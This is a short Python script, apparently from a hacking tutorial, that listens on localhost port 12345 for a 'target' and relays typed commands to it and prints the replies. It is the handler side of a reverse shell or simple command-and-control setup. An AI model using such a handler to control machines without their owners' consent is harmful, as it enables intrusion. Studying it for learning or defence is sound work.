#!/usr/bin/python3
import socket


# CREATES THE SOCKET
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# BINDING
s.bind(("127.0.0.1", 12345))
s.listen(1)
print("Listening for incoming connections...")

# ACCEPT CONNECTION
target, ip = s.accept()
print("Target Connected!")

while True:

    # SEND AND RECEIVE COMMANDS
    message = input("* Shell#~%s: " % str(ip))
    target.send(message.encode())
    
    if message == "q":
        break
    else:
        answer = target.recv(1024).decode()
        print(answer)

# CLOSE CONNECTION
s.close()